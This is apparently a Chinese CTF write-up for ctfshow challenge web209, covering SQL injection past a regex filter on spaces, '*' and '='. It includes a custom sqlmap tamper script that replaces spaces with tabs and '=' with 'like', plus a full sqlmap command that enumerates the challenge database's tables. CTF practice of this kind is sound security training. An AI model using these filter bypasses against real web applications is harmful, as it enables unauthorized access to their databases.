&lt;h1 id=&#34;web209&#34;&gt;&lt;a href=&#34;#web209&#34; class=&#34;headerlink&#34; title=&#34;web209&#34;&gt;&lt;/a&gt;web209&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;--tamper 的3体验


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39;) limit 0,1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //TODO 未完工
   return preg_match(&amp;#39;/ |\*|\=/&amp;#39;, $str);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap的tamper脚本没有针对这道题的过滤的脚本，需要自己对tamper脚本做简单修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用 &lt;code&gt;%0a&lt;/code&gt; 绕过空格和 &lt;code&gt;*&lt;/code&gt; ，用 &lt;code&gt;like&lt;/code&gt; 绕过 &lt;code&gt;=&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap 自带的tamper脚本 &lt;code&gt;space2comment.py&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/env python

&amp;quot;&amp;quot;&amp;quot;
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file &amp;#39;LICENSE&amp;#39; for copying permission
&amp;quot;&amp;quot;&amp;quot;

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &amp;quot;&amp;quot;&amp;quot;
    Replaces space character (&amp;#39; &amp;#39;) with comments &amp;#39;/**/&amp;#39;

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &amp;gt;&amp;gt;&amp;gt; tamper(&amp;#39;SELECT id FROM users&amp;#39;)
    &amp;#39;SELECT/**/id/**/FROM/**/users&amp;#39;
    &amp;quot;&amp;quot;&amp;quot;

    retVal = payload

    if payload:
        retVal = &amp;quot;&amp;quot;
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += &amp;quot;/**/&amp;quot;
                    continue

            elif payload[i] == &amp;#39;\&amp;#39;&amp;#39;:
                quote = not quote

            elif payload[i] == &amp;#39;&amp;quot;&amp;#39;:
                doublequote = not doublequote

            elif payload[i] == &amp;quot; &amp;quot; and not doublequote and not quote:
                retVal += &amp;quot;/**/&amp;quot;
                continue

            retVal += payload[i]

    return retVal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ctfshow209sqlmap.py&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/env python
#ctfshow209 by AlgoZZi

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    &amp;quot;&amp;quot;&amp;quot;
    自定义 tamper 脚本
    功能：
        1. 将空格替换为 &amp;quot;%0a&amp;quot;，用于绕过部分 WAF
        2. 将等号 &amp;quot;=&amp;quot; 替换为 &amp;quot;chr(0x9) + &amp;quot;like&amp;quot; + chr(0x9)&amp;quot;，制造语义混淆
    使用场景：
        可用于 SQL 注入时绕过简单的过滤规则
    &amp;quot;&amp;quot;&amp;quot;

    retVal = payload

    if payload:
        retVal = &amp;quot;&amp;quot;
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            # 处理第一个空格
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x9)
                    continue

            # 单引号开关（避免替换引号中的空格）
            elif payload[i] == &amp;#39;\&amp;#39;&amp;#39;:
                quote = not quote

            # 双引号开关（避免替换引号中的空格）
            elif payload[i] == &amp;#39;&amp;quot;&amp;#39;:
                doublequote = not doublequote

            # 普通空格替换为 chr(0x9)
            elif payload[i] == &amp;quot; &amp;quot; and not doublequote and not quote:
                retVal += chr(0x9)
                continue

            # 等号替换为 chr(0x9) + &amp;quot;like&amp;quot; + chr(0x9)
            elif payload[i] == &amp;quot;=&amp;quot; and not doublequote and not quote:
                retVal += chr(0x9) + &amp;quot;like&amp;quot; + chr(0x9)
                continue

            # 其他字符保持不变
            retVal += payload[i]

    return retVal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --tamper=ctfshow209sqlmap -D ctfshow_web --tables
